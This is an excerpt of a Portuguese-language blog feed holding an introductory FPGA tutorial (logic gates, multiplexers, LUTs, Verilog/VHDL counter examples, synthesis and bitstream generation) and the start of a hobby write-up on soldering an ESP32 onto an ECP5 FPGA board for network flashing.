<p><img src="/assets/posts/tracker-mount/photo_2021-03-03_22-56-26.jpg" alt="Motor da Elevação" /><em>Motor da Elevação</em></p>]]></content><author><name>Lucas Teske</name></author><category term="Reverse Engineering" /><category term="Satellite" /><category term="SDR" /><category term="Airspy" /><category term="EMWIN" /><category term="GOES" /><category term="Hearsat" /><category term="LRIT" /><category term="RE" /><category term="Reverse Engineering" /><category term="Sat" /><category term="Satellite" /><category term="SDR" /><summary type="html"><![CDATA[A uns anos atrás eu comprei um rotor para câmera da Pelco, modelo PT175-24P. Esse rotor é feito para carregar uma câmera com lente de até 8kg, e contém dois motores bifásicos reversiveis internamente. Minha ideia era (e é) colocar uma parabólica acoplada, e controlar seu movimento para rastrear satélites. Assim eu poderia executar a recepção de satélites de baixa órbita.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/posts/tracker-mount/head.jpg" /><media:content medium="image" url="https://lucasteske.dev/assets/posts/tracker-mount/head.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Introdução a FPGA</title><link href="https://lucasteske.dev/2020/10/introducao-a-fpga" rel="alternate" type="text/html" title="Introdução a FPGA" /><published>2020-10-12T02:59:00+00:00</published><updated>2020-10-12T02:59:00+00:00</updated><id>https://lucasteske.dev/2020/10/introducao-a-fpga</id><content type="html" xml:base="https://lucasteske.dev/2020/10/introducao-a-fpga"><![CDATA[<p>Esta é a primeira parte do guia de programação para FPGAs! Este guia irá virar eventualmente um <code class="language-plaintext highlighter-rouge">verilog4noobs</code> para qualquer pessoa que quiser iniciar na área de programação de hardware possa ter um jeito fácil de conseguir! Iremos começar a explicar o que é um FPGA e como ele funciona.</p>

<p>Para quem preferir, este artigo foi feito em base na Livestream sobre Verilog que fiz a um tempo atrás e está disponível no YouTube: <a href="https://www.youtube.com/watch?v=BcKwqju5gxA">https://www.youtube.com/watch?v=BcKwqju5gxA</a></p>

<h1 id="o-que-é-um-fpga">O que é um FPGA</h1>

<p>FPGA é uma abreviatura para Field Programmable Gate Array, ou Matriz de Portas Programáveis em Campo. O termo <code class="language-plaintext highlighter-rouge">campo</code> usado aqui se refere ao fato de que o chip pode ser programado após sair da fábrica. O termo <code class="language-plaintext highlighter-rouge">portas</code> se referem a portas lógicas.</p>

<p>Alguns exemplos de portas lógicas:</p>

<p><img src="/assets/posts/introducao_a_fpga/logic-gates.svg" alt="Portas Lógicas" /><em>Portas Lógicas - Remix de <a href="https://commons.wikimedia.org/wiki/File:Circuit_elements.svg">https://commons.wikimedia.org/wiki/File:Circuit_elements.svg</a></em></p>

<h2 id="portas-lógicas">Portas Lógicas</h2>

<p>As portas lógicas efetuam operações lógicas entre bits, e podem ter <strong>N</strong> entradas e uma saída. O FPGA é uma matriz de portas lógicas as quais podem ser interligadas para gerar circuitos lógicos equivalentes a qualquer chip desejado. Portas lógicas são blocos bem simples, e geralmente podem ser representados com poucos transístores. Por exemplo, dado <code class="language-plaintext highlighter-rouge">A</code>, <code class="language-plaintext highlighter-rouge">B</code> entradas e <code class="language-plaintext highlighter-rouge">Q</code> saída. Podemos implementar portas NOT, NAND e NOR destas maneiras:</p>

<p><img src="/assets/posts/introducao_a_fpga/logic-not-transistor.svg" alt="Porta Inversora (NOT) em transístores" /><em>Representação em transístores bipolares de uma <strong>Porta Inversora</strong> (NOT)</em></p>

<p><img src="/assets/posts/introducao_a_fpga/logic-nand-transistor.svg" alt="Porta Não-E (NAND) em transístores" /><em>Representação em transístores bipolares de uma <strong>Porta Não-E</strong> (NAND)</em></p>

<p><img src="/assets/posts/introducao_a_fpga/logic-nor-transistor.svg" alt="Porta Não-OU (NOR) em transístores" /><em>Representação em transístores bipolares de uma <strong>Porta Não-OU</strong> (NOR)</em></p>

<p>As operações lógicas realizadas pelas portas lógicas descritas seguem a seguinte tabela da verdade:</p>

<div class="truth-table-holder">
  <div class="truth-table-container">
    <table id="andtable" class="truth">
      <tbody>
        <tr>
          <td colspan="4"><b>Porta E</b></td>
        </tr>
        <tr>
          <th>A</th>
          <th>B</th>
          <th class="dv"></th>
          <th>A &amp; B</th>
        </tr>
        <tr>
          <td>0</td>
          <td>0</td>
          <td class="dv"></td>
          <td class="mc">0</td>
        </tr>
        <tr>
          <td>0</td>
          <td>1</td>
          <td class="dv"></td>
          <td class="mc">0</td>
        </tr>
        <tr>
          <td>1</td>
          <td>0</td>
          <td class="dv"></td>
          <td class="mc">0</td>
        </tr>
        <tr>
          <td>1</td>
          <td>1</td>
          <td class="dv"></td>
          <td class="mc">1</td>
        </tr>
      </tbody>
    </table>
  </div>
  <div class="truth-table-container">
    <table id="ortable" class="truth">
      <tbody>
        <tr>
          <td colspan="4"><b>Porta OU</b></td>
        </tr>
        <tr>
          <th>A</th>
          <th>B</th>
          <th class="dv"></th>
          <th>A | B</th>
        </tr>
        <tr>
          <td>0</td>
          <td>0</td>
          <td class="dv"></td>
          <td class="mc">0</td>
        </tr>
        <tr>
          <td>0</td>
          <td>1</td>
          <td class="dv"></td>
          <td class="mc">1</td>
        </tr>
        <tr>
          <td>1</td>
          <td>0</td>
          <td class="dv"></td>
          <td class="mc">1</td>
        </tr>
        <tr>
          <td>1</td>
          <td>1</td>
          <td class="dv"></td>
          <td class="mc">1</td>
        </tr>
      </tbody>
    </table>
  </div>
  <div class="truth-table-container">
    <table id="nottable" class="truth">
      <tbody>
        <tr>
          <td colspan="3"><b>Porta Inversora</b></td>
        </tr>
        <tr>
          <th>A</th>
          <th class="dv"></th>
          <th>~A</th>
        </tr>
        <tr>
          <td>0</td>
          <td class="dv"></td>
          <td class="mc">1</td>
        </tr>
        <tr>
          <td>1</td>
          <td class="dv"></td>
          <td class="mc">0</td>
        </tr>
      </tbody>
    </table>
  </div>
</div>
<p><br /></p>

<p>Porém você nunca sabe especificamente qual porta irá usar em qual posição do FPGA. Por essa dúvida, seria nescessário cada <code class="language-plaintext highlighter-rouge">bloco</code> do FPGA conter todos os tipos básicos de portas lógicas para que na hora de ligar, pudesse escolher a porta correta. Isso tornaria o chip ineficiente pois de N portas que um bloco teria, você apenas usaria uma.</p>

<p>Felizmente o FPGA não usa portas lógicas na sua maneira primitiva. Ao invés disso ele usa uma “porta programável” feita com um circuito lógico chamado <strong>multiplexador</strong>.</p>

<h2 id="o-que-é-um-multiplexador">O que é um Multiplexador</h2>

<p>Um multiplexador é uma unidade lógica de N entradas com apenas uma saída, e log2(N) entradas de controle. Abaixo segue um exemplo de um multiplexador de 8 entradas.</p>

<p><img src="/assets/posts/introducao_a_fpga/mux.svg" alt="Multiplexador 8 entradas" />*</p>

<p>Neste multiplexador temos:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">X0-X7</code>   =&gt; Entrada de dados</li>
  <li><code class="language-plaintext highlighter-rouge">A, B, C</code> =&gt; Entrada de controle</li>
  <li><code class="language-plaintext highlighter-rouge">O</code>       =&gt; Saída</li>
</ul>

<p>As entradas A, B e C formam um número de 3 bits que representam qual entrada X estará ligada a saída O.
<br /></p>

<div class="truth-table-container">
  <table id="muxtable" class="truth">
    <tbody>
      <tr>
        <td colspan="5"><b>MUX8</b></td>
      </tr>
      <tr>
        <th>A</th>
        <th>B</th>
        <th>C</th>
        <th class="dv"></th>
        <th>O</th>
      </tr>
      <tr>
        <td>0</td>
        <td>0</td>
        <td>0</td>
        <td class="dv"></td>
        <td class="mc">X0</td>
      </tr>
      <tr>
        <td>0</td>
        <td>0</td>
        <td>1</td>
        <td class="dv"></td>
        <td class="mc">X1</td>
      </tr>
      <tr>
        <td>0</td>
        <td>1</td>
        <td>0</td>
        <td class="dv"></td>
        <td class="mc">X2</td>
      </tr>
      <tr>
        <td>0</td>
        <td>1</td>
        <td>1</td>
        <td class="dv"></td>
        <td class="mc">X3</td>
      </tr>
      <tr>
        <td>1</td>
        <td>0</td>
        <td>0</td>
        <td class="dv"></td>
        <td class="mc">X4</td>
      </tr>
      <tr>
        <td>1</td>
        <td>0</td>
        <td>1</td>
        <td class="dv"></td>
        <td class="mc">X5</td>
      </tr>
      <tr>
        <td>1</td>
        <td>1</td>
        <td>0</td>
        <td class="dv"></td>
        <td class="mc">X6</td>
      </tr>
      <tr>
        <td>1</td>
        <td>1</td>
        <td>1</td>
        <td class="dv"></td>
        <td class="mc">X7</td>
      </tr>
    </tbody>
  </table>
</div>

<p>Com a sua contra-parte (demultiplexador ou demux), é possível transferir vários canais de dados em apenas um canal, desde que ambos Mux e Demux estejam com os valores A,B,C corretamente configurados. Porém para FPGA’s MUX geralmente são usados de maneiras diferentes. Em lógica digital, você pode usar um MUX para implementar <em>qualquer</em> porta lógica associando as entradas do mux a valores pré-definidos.</p>

<h2 id="implementando-portas-lógicas-com-multiplexador">Implementando portas lógicas com Multiplexador</h2>

<p>A implementação de portas lógicas pode parecer complexa, mas para portas simples (NOT, OR, AND) é bem simples de entender o funcionamento. Vamos usar um MUX de 2 entradas (1 bit).</p>

<p><img src="/assets/posts/introducao_a_fpga/mux2.svg" alt="Multiplexador 2 entradas" />*</p>

<p>Neste caso a tabela da verdade é bem mais simples:</p>

<div class="truth-table-container">
  <table id="mux2table" class="truth">
    <tbody>
      <tr>
        <td colspan="4"><b>MUX2</b></td>
      </tr>
      <tr>
        <th>A</th>
        <th class="dv"></th>
        <th>O</th>
      </tr>
      <tr>
        <td>0</td>
        <td class="dv"></td>
        <td class="mc">X0</td>
      </tr>
      <tr>
        <td>1</td>
        <td class="dv"></td>
        <td class="mc">X1</td>
      </tr>
    </tbody>
  </table>
</div>
<p><br /></p>

<p>De modo que se quisermos que o MUX2 vire uma porta inversora, podemos apenas pré-configurar as entradas X0 e X1 com os valores 1 e 0.</p>

<div class="truth-table-container">
  <table id="mux2table" class="truth">
    <tbody>
      <tr>
        <td colspan="6"><b>MUX2-NOT</b></td>
      </tr>
      <tr>
        <th>X0</th>
        <th>X1</th>
        <th>A</th>
        <th class="dv"></th>
        <th>O porta</th>
        <th>O valor</th>
      </tr>
      <tr>
        <td>1</td>
        <td>0</td>
        <td class="tv">0</td>
        <td class="dv"></td>
        <td class="mc">X0</td>
        <td class="mc">1</td>
      </tr>
      <tr>
        <td>1</td>
        <td>0</td>
        <td class="tv">1</td>
        <td class="dv"></td>
        <td class="mc">X1</td>
        <td class="mc">0</td>
      </tr>
    </tbody>
  </table>
</div>
<p><br /></p>

<p>Caso queiramos fazer uma porta AND, podemos configurar a entrada X0 como 0, e usar a entrada X1 e A como entradas da porta AND</p>

<div class="truth-table-container">
  <table id="mux2table" class="truth">
    <tbody>
      <tr>
        <td colspan="6"><b>MUX2-AND</b></td>
      </tr>
      <tr>
        <th>X0 (FIXO)</th>
        <th>X1 (AND0)</th>
        <th>A (AND1)</th>
        <th class="dv"></th>
        <th>O porta</th>
        <th>O valor</th>
      </tr>
      <tr>
        <td>0</td>
        <td class="tv">0</td>
        <td class="tv">0</td>
        <td class="dv"></td>
        <td class="mc">X0</td>
        <td class="mc">0</td>
      </tr>
      <tr>
        <td>0</td>
        <td class="tv">0</td>
        <td class="tv">1</td>
        <td class="dv"></td>
        <td class="mc">X1</td>
        <td class="mc">0</td>
      </tr>
      <tr>
        <td>0</td>
        <td class="tv">1</td>
        <td class="tv">0</td>
        <td class="dv"></td>
        <td class="mc">X0</td>
        <td class="mc">0</td>
      </tr>
      <tr>
        <td>0</td>
        <td class="tv">1</td>
        <td class="tv">1</td>
        <td class="dv"></td>
        <td class="mc">X1</td>
        <td class="mc">1</td>
      </tr>
    </tbody>
  </table>
</div>
<p><br /></p>

<p>Ou no caso de uma porta OR, fixamos o valor de X1 em 1 e usamos X0 e A como operadores OR.</p>

<div class="truth-table-container">
  <table id="mux2table" class="truth">
    <tbody>
      <tr>
        <td colspan="6"><b>MUX2-OR</b></td>
      </tr>
      <tr>
        <th>X0 (OR0)</th>
        <th>X1 (FIXO)</th>
        <th>A (OR1)</th>
        <th class="dv"></th>
        <th>O porta</th>
        <th>O valor</th>
      </tr>
      <tr>
        <td class="tv">0</td>
        <td>1</td>
        <td class="tv">0</td>
        <td class="dv"></td>
        <td class="mc">X0</td>
        <td class="mc">0</td>
      </tr>
      <tr>
        <td class="tv">0</td>
        <td>1</td>
        <td class="tv">1</td>
        <td class="dv"></td>
        <td class="mc">X1</td>
        <td class="mc">1</td>
      </tr>
      <tr>
        <td class="tv">1</td>
        <td>1</td>
        <td class="tv">0</td>
        <td class="dv"></td>
        <td class="mc">X0</td>
        <td class="mc">1</td>
      </tr>
      <tr>
        <td class="tv">1</td>
        <td>1</td>
        <td class="tv">1</td>
        <td class="dv"></td>
        <td class="mc">X1</td>
        <td class="mc">1</td>
      </tr>
    </tbody>
  </table>
</div>
<p><br /></p>

<p>Existem outras operações que podem ser implementadas usando multiplexadores, inclusive operações mais complexas caso o multiplexador tenha mais entradas. Este uso é frequentemente chamado de Lookup-Table (ou Tabela de Consulta em português). Os detalhes de como criar operações não serão discutidos aqui (porém se quiserem, posso fazer um artigo no futuro sobre :) ), mas com essas informações já conseguimos explicar como funciona as células do FPGA!</p>

<h2 id="lut-lookup-table-dos-fpgas">“LUT” Lookup-Table dos FPGAs</h2>

<p>Cada célula do FPGA contém (em geral) uma LUT (Lookup-Table), um Flip-Flop tipo D e um mux 2:1.</p>

<p><img src="/assets/posts/introducao_a_fpga/fpga-logic-cell.svg" alt="Célula Lógica do FPGA" /><em>Célula Lógica do FPGA</em></p>

<p>O flip-flop serve para sincronização dos dados quando a operação é feita sob um domínio de um clock (um sinal de sincronia). Já o MUX 2:1 serve para selecionar se aquela célula será sincronizada com algo ou não (ela alterna entre a saída do flip-flop e a saída direto da LUT).</p>

<p>As LUT’s seguem o princípio da reprogramabilidade do multiplexador como foi comentado na seção anterior, onde cada uma das entradas pode estar ligada a um nível lógico fixo ( 0 ou 1 ) ou a outras células / Pinos de entrada. Cada célula independente pode não fazer muita coisa por sí, porém interligadas a outras células podem fazer praticamente qualquer coisa!</p>

<h1 id="o-que-é-uma-hdl">O que é uma HDL</h1>

<p>HDL significa Hardware Description Language (ou Linguagem de Descrição de Hardware). Uma HDL serve para abstrair os conceitos de portas lógicas e células do FPGA para um nível onde fique mais fácil de pensar na lógica do programa. Uma HDL é efetivamente traduzida a netlist (lista de nós) de pseudo-LUTs que será usada para preparar o conjunto de dados que irá efetivamente ligar as células dentro do FPGA.</p>

<p>As duas linguagens mais tradicionais são VHDL e Verilog. Ambas são suportadas pela grande maioria de ferramentas de FPGA especificas dos fabricantes e também das de código fonte aberto.</p>

<div class="language-verilog highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Exemplo em Verilog</span>
<span class="k">module</span> <span class="n">contador</span> <span class="p">(</span> <span class="c1">// Definição de entradas e saídas do módulo</span>
  <span class="n">out</span>     <span class="p">,</span>  <span class="c1">// Saída do contador</span>
  <span class="n">enable</span>  <span class="p">,</span>  <span class="c1">// Sinal de ativação do contador</span>
  <span class="n">clk</span>     <span class="p">,</span>  <span class="c1">// Sinal de clock</span>
  <span class="n">reset</span>      <span class="c1">// Sinal de reset</span>
<span class="p">);</span>
<span class="c1">// ------------- Portas de saída ----------</span>
    <span class="kt">output</span> <span class="p">[</span><span class="mi">7</span><span class="o">:</span><span class="mi">0</span><span class="p">]</span> <span class="n">out</span><span class="p">;</span> <span class="c1">// Saída de 8 bits</span>
<span class="c1">// ------------ Portas de Entrada ---------</span>
    <span class="kt">input</span> <span class="n">enable</span><span class="p">,</span> <span class="n">clk</span><span class="p">,</span> <span class="n">reset</span><span class="p">;</span>
<span class="c1">// ------------ Variáveis Internas --------</span>
    <span class="kt">reg</span> <span class="p">[</span><span class="mi">7</span><span class="o">:</span><span class="mi">0</span><span class="p">]</span> <span class="n">out</span><span class="p">;</span> <span class="c1">// Contador de 8 bits, associado a saída out</span>

<span class="c1">// ------------- Código começa aqui -------</span>

<span class="k">always</span> <span class="o">@</span><span class="p">(</span><span class="kt">posedge</span> <span class="n">clk</span><span class="p">)</span>
<span class="k">if</span> <span class="p">(</span><span class="n">reset</span><span class="p">)</span> <span class="k">begin</span>
  <span class="n">out</span> <span class="o">&lt;=</span> <span class="mb">8'b0</span> <span class="p">;</span>
<span class="k">end</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">enable</span><span class="p">)</span> <span class="k">begin</span>
  <span class="n">out</span> <span class="o">&lt;=</span> <span class="n">out</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
<span class="k">end</span>

<span class="k">endmodule</span>
</code></pre></div></div>

<div class="language-vhdl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- Exemplo em VHDL</span>
<span class="k">library</span> <span class="n">ieee</span><span class="p">;</span>
  <span class="k">use</span> <span class="n">ieee</span><span class="o">.</span><span class="n">std_logic_1164</span><span class="o">.</span><span class="k">all</span><span class="p">;</span>
  <span class="k">use</span> <span class="n">ieee</span><span class="o">.</span><span class="n">std_logic_unsigned</span><span class="o">.</span><span class="k">all</span><span class="p">;</span>

<span class="c1">-- Definição de entradas e saídas do módulo</span>
<span class="k">entity</span> <span class="n">contador</span> <span class="k">is</span>
  <span class="k">port</span> <span class="p">(</span>
    <span class="n">cout</span>   <span class="p">:</span><span class="k">out</span> <span class="kt">std_logic_vector</span> <span class="p">(</span><span class="mi">7</span> <span class="k">downto</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">-- Saída de 8 bits do contador</span>
    <span class="n">enable</span> <span class="p">:</span><span class="k">in</span>  <span class="kt">std_logic</span><span class="p">;</span>                     <span class="c1">-- Sinal de ativação do contador</span>
    <span class="n">clk</span>    <span class="p">:</span><span class="k">in</span>  <span class="kt">std_logic</span><span class="p">;</span>                     <span class="c1">-- Sinal de clock</span>
    <span class="n">reset</span>  <span class="p">:</span><span class="k">in</span>  <span class="kt">std_logic</span>                      <span class="c1">-- Sinal de reset</span>
  <span class="p">);</span>
<span class="k">end</span> <span class="k">entity</span><span class="p">;</span>

<span class="c1">-- Definição do funcionamento do módulo</span>
<span class="k">architecture</span> <span class="n">rtl</span> <span class="k">of</span> <span class="n">contador</span> <span class="k">is</span>
  <span class="k">signal</span> <span class="n">count</span> <span class="p">:</span><span class="kt">std_logic_vector</span> <span class="p">(</span><span class="mi">7</span> <span class="k">downto</span> <span class="mi">0</span><span class="p">);</span>
<span class="k">begin</span>
  <span class="k">process</span> <span class="p">(</span><span class="n">clk</span><span class="p">,</span> <span class="n">reset</span><span class="p">)</span> <span class="k">begin</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">reset</span> <span class="o">=</span> <span class="sc">'1'</span><span class="p">)</span> <span class="k">then</span>
      <span class="n">count</span> <span class="o">&lt;=</span> <span class="p">(</span><span class="k">others</span><span class="o">=&gt;</span><span class="sc">'0'</span><span class="p">);</span>
    <span class="k">elsif</span> <span class="p">(</span><span class="n">rising_edge</span><span class="p">(</span><span class="n">clk</span><span class="p">))</span> <span class="k">then</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">enable</span> <span class="o">=</span> <span class="sc">'1'</span><span class="p">)</span> <span class="k">then</span>
        <span class="n">count</span> <span class="o">&lt;=</span> <span class="n">count</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
      <span class="k">end</span> <span class="k">if</span><span class="p">;</span>
    <span class="k">end</span> <span class="k">if</span><span class="p">;</span>
  <span class="k">end</span> <span class="k">process</span><span class="p">;</span>
  <span class="n">cout</span> <span class="o">&lt;=</span> <span class="n">count</span><span class="p">;</span>
<span class="k">end</span> <span class="k">architecture</span><span class="p">;</span>
</code></pre></div></div>

<p>Existe outro processo de geração que usam linguagens de mais alto nível (por exemplo C++ ou Python), este processo se chama High Level Synthesis (Síntese de Alto Nível), onde o código do FPGA é construido programaticamente em uma linguagem de mais alto nível e no fim é gerado um código Verilog / VHDL para sintetização habitual. Alguns dos processos geram diretamente a netlist, porém muitos softwares de empresas de FPGA usam padrões próprios de netlist o que pode tornar um problema o suporte.</p>

<h1 id="processo-de-compilação-sintentização">Processo de “compilação” (sintentização)</h1>

<p>No processo de compilação, ou melhor dizendo, sintetização (que é o termo adequado pra esse processo) um código escrito em HDL se torna uma netlist que será usada para construção do que será o código que ficará na memória do FPGA. Neste processo as entradas e saídas da netlist tem nomes simbólicos que apontam para alguma entrada/saída do chip. A netlist é agnóstica a esses nomes e eles só representaram algo significativo para os processos finais da síntese.</p>

<p>Neste passo são feitas várias otimizações do circuito lógico para que haja o mínimo possível de nós na netlist. Algumas dessas otimizações podem ser feitas assumindo algum FPGA especifico (pelo tamanho de sua LUT). Após a netlist pronta, as ferramentas deverão “achar um jeito de encaixar” o netlist no FPGA alvo. Este passo é chamado Place &amp; Route (Colocar e Rotear)</p>

<h1 id="place--route">Place &amp; Route</h1>

<p>O processo de place &amp; route é muito similar a quando um engenheiro desenha uma placa de circuito impresso. Você coloca os componentes na placa e liga os fios entre eles. Dependendo do circuito isto pode ser fácil ou difícil. Imagine que quanto mais espaço da placa seus componentes ocupar, mais difícil é de achar um caminho para todas suas trilhas. O mesmo ocorre com o FPGA.</p>

<p>Este passo é <strong>sempre</strong> especifico do FPGA de destino, onde parâmetro como linhas globais de clock, tamanho de LUT e posição de LUT são levadas em conta. Além disso, algumas ferramentas permitem colocar restrições nos parâmetro de delay, clock mínimo e tensão elétrica para as rotas. Com todas essas informações, o programa de Place &amp; Route irá tentar achar uma configuração válida para aquele FPGA.</p>

<p>Dependendo da complexidade do projeto, o tempo pode ser desde alguns segundos até alguns dias. Além disso pode também não ser possível rotear o seu código no FPGA destino, mesmo que este não ocupe o FPGA inteiro!</p>

<p>Após o processo estar completo, a netlist será incrementada com a posição <strong>física</strong> dos nós dentro do FPGA, por exemplo:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// Antes do Place &amp; Route
LUT4(0,1,0,1) -&gt; LUT4(1,1,0,0)
// Depois do Place &amp; Route
LUT4_0.0(0,1,0,1) -&gt; LUT4_1.1(1,1,0,0) // one 0.0 e 1.1 são as coordenadas dentro do chip
</code></pre></div></div>

<p>Após isso seu programa está completo, e o único passo restante é gerar a sequência de bits que irão programar o FPGA para esta configuração!</p>

<h1 id="geração-de-bitstream">Geração de Bitstream</h1>

<p>A ultima etapa do processo é a geração do bitstream. Este gerador recebe como entrada a netlist complementada com as posições físicas das células do FPGA e como elas se interligam e converte para uma sequência de bits proprietária do FPGA. Cada marca e modelo de FPGA tem uma sequência especifica para programação e sua programação também pode variar do meio de origem.</p>

<p>Por exemplo, um FPGA pode ser programado via:</p>

<ul>
  <li>“Porta Serial” (Na verdade pino de programação serial)</li>
  <li>JTAG</li>
  <li>Memória Flash SPI</li>
</ul>

<h1 id="next-steps">Next steps…</h1>

<p>Todos estes processos vão ficar mais claros nos próximos artigos! Esta é a primeira parte de uma série de posts sobre Verilog e programação para FPGA. Farei assim que possível o próximo post :D</p>

<p>Espero que tenham gostado!</p>]]></content><author><name>Lucas Teske</name></author><category term="Portugues" /><category term="Hacking" /><category term="FPGA" /><category term="Hardware" /><category term="Eletrônica" /><category term="Verilog" /><category term="Hacking" /><category term="FPGA" /><category term="ICEWolf" /><category term="IceStick" /><category term="ECP5" /><category term="Lattice" /><category term="Hardware" /><category term="Eletrônica" /><category term="Verilog" /><summary type="html"><![CDATA[Esta é a primeira parte do guia de programação para FPGAs! Este guia irá virar eventualmente um verilog4noobs para qualquer pessoa que quiser iniciar na área de programação de hardware possa ter um jeito fácil de conseguir! Iremos começar a explicar o que é um FPGA e como ele funciona.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/FPGA.jpg" /><media:content medium="image" url="https://lucasteske.dev/assets/FPGA.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Hackeando um ESP32 num FPGA</title><link href="https://lucasteske.dev/2020/06/hacking-a-esp32-into-fpga-board" rel="alternate" type="text/html" title="Hackeando um ESP32 num FPGA" /><published>2020-06-14T19:17:00+00:00</published><updated>2020-06-14T19:17:00+00:00</updated><id>https://lucasteske.dev/2020/06/hacking-a-esp32-into-fpga-board</id><content type="html" xml:base="https://lucasteske.dev/2020/06/hacking-a-esp32-into-fpga-board"><![CDATA[<h1 id="hackeando-um-esp32-num-fpga">Hackeando um ESP32 num FPGA</h1>

<p>No ano passado eu vi um cara russo que viu que essa placa barata (US$15) tinha um FPGA da Lattice ECP5, o qual é compatível com as toolchains opensource para síntese. Ele estava rodando um RISC-V dentro e enviando a saída serial pela rede usando uma das portas de rede. Eu queria conseguir uma e começar a brincar. Essas placas são relativamente baratas (mais ou menos US$15) e tem um FPGA da Lattice ( LFE5U-25F-6BG381C ), 4MB DRAM, duas portas gigabit e vários level shifters. Isso é bom por que:</p>

<ol>
  <li>É uma placa barata pelas especificações</li>
  <li>Você pode usar uma toolchain opensource</li>
  <li>Tem MUITOS level-shifter para 5V e eles são bi-direcionais.</li>
</ol>

<p>Eu decidi tentar comprar uma do Aliexpress, mas por causa da pandemia do COVID-19, o pacote está super atrasado (ele ainda não chegou, mesmo 3 meses depois de ter pedido). Por sorte eu achei no Mercado Livre para vender por um preço razoável (R$220).</p>

<p>Quando chegou, eu tentei rodar o clássico Hello World para Hardware: O Led Blink. Para isso eu usei este projeto para testar: <a href="https://github.com/antonblanchard/ghdl-yosys-blink">https://github.com/antonblanchard/ghdl-yosys-blink</a></p>

<p>Eu fiz um fork e adicionei as configurações da placa e também a configuração para usar um adaptador FR232R no modo bitbang com o OpenOCD (por que era o único método possível de JTAG disponível no momento). <a href="https://github.com/racerxdl/ghdl-yosys-blink">https://github.com/racerxdl/ghdl-yosys-blink</a></p>

<p>Eu não precisei fazer engenharia reversa na placa pois já tinham feito: <a href="https://github.com/q3k/chubby75/blob/master/5a-75b/hardware_V6.1.md">https://github.com/q3k/chubby75/blob/master/5a-75b/hardware_V6.1.md</a></p>

<p>Como dá pra ver, os headers JTAG são de fácil acesso e todos os pinos estão mapeados. Excelente!</p>

<p>Depois de alguns minutos brincando com o ghdl-yosis-blink eu consegui fazer funcionar na minha placa. Porém ele ainda estava rodando na RAM do FPGA e eu queria gravar na memória flash. Então eu comecei a procurar pela internet alguma ferramente que conseguisse converter o bitstream para programar a memória flash. Depois de testar muitas ferramentas, eu achei uma simples que faz o trabalho: <a href="https://github.com/f32c/tools/tree/master/ujprog">https://github.com/f32c/tools/tree/master/ujprog</a></p>

<p>Só era nescessário rodar:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ujprog <span class="nt">-d</span> <span class="nt">-j</span> flash <span class="nt">-s</span> vhdl_blink-flash.svf vhdl_blink.bit
</code></pre></div></div>

<p>E o arquivo gerado vhdl_blink-flash.svf estava persistindo o bitstream na memoria flash.</p>

<center>
  <blockquote class="twitter-tweet"><p lang="en" dir="ltr">After few days I managed to write thr SPI Flash using FT232H. Full <a href="https://twitter.com/hashtag/opensource?src=hash&amp;ref_src=twsrc%5Etfw">#opensource</a> stuff to program that board. Also only US$15. <a href="https://t.co/RujsOGwH1D">pic.twitter.com/RujsOGwH1D</a></p>&mdash; Cybernetic Lover (@lucasteske) <a href="https://twitter.com/lucasteske/status/1268616857583419393?ref_src=twsrc%5Etfw">June 4, 2020</a></blockquote> <script async="" src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
</center>

<p>Agora que tudo estava funcionando, eu decidi ir para o hack maior: Eu queria um ESP32 ligado na placa e gravar o FPGA via rede. E também seria legal se eu conseguisse redirecionar uma porta serial para rede (bom para depurar).</p>

<p>A primeira coisa que fiz foi escolher um par de GPIO para ser o TX/RX da porta serial. O ESP32 tem três portas seriais, porém na minha placa apenas dois são expostos (Serial 0 e 2). A porta serial 0 está ligada ao conversor USB-Serial, então eu decidi usar a porta Serial 2 para comunicar com FPGA. Após olhar a pinagem da placa FPGA, eu vi que a maioria dos pinos dos level-shifters são comuns (as linhas de endereço são responsáveis pela metade dos pinos) e os level-shifters próximos da borda inferior da placa eram da linha de endereço. Depois de procurar um pouco, eu decidi remover o conector J4 da placa e o level-shifter U23 (o ESP32 é 3.3V, lembre-se disso!).</p>

<p><img src="/assets/posts/medium/0_wK9QPXyVChE4n8py.jpeg" alt="U23 e J4 removidos" /><em>U23 e J4 removidos</em></p>

<p>Eu também decidi remover o J3 para facilitar a solda dos fios de bypass no conector. Então eu soldei todos fios para fazer o conector ser 3.3V ao invés de 5V.</p>

<p><img src="/assets/posts/medium/1_tT_gWmR6KPWXKKoewW-KDQ.png" alt="Fios soldados no U23" /><em>Fios soldados no U23</em></p>

<p>Os resistores de 33 Ohm são bons, pois eles evitam curto-circuitos caso os pinos associados a porta serial estejam errados. Então decidi deixar eles como estão. Após checar que todos os pinos estavam ok e não estavam em curto, eu decidi usar cola quente para prender eles:</p>

<p><img src="/assets/posts/medium/1_53DN-rC8MrNRfFdVmzN-Uw.png" alt="Pedaços de cola quente" /><em>Pedaços de cola quente</em></p>

<p>Eu sempre preferi usar um soprador térmico a 200ºC ao invés da pistola de cola quente. Isso também evita que eu super-aqueça a placa e os fios saiam.</p>

<p><img src="/assets/posts/medium/1_7O77I22KdFxtNz4-G2cSeA.png" alt="Soprador térmico e cola quente" /><em>Soprador térmico e cola quente</em></p>

<p>Depois de esfriar os resultados ficaram bons!</p>

<p><img src="/assets/posts/medium/1_sCDf7DO_2mY2FoOTLN357Q.png" alt="Cola quente e os fios de bypass" /><em>Cola quente e os fios de bypass</em></p>

<p>Então comecei a trabalhar na parte de trás da placa soldando o pair VCC/GND e o par TX/RX. Por sorte o conector de energia nessa placa aceita de 3.6V até 6V então eu posso usar o pino VIN do ESP32 (que está conectado aos +5V da porta USB) para alimentar a placa. O conector de energia também está perto do J4 que removemos.</p>

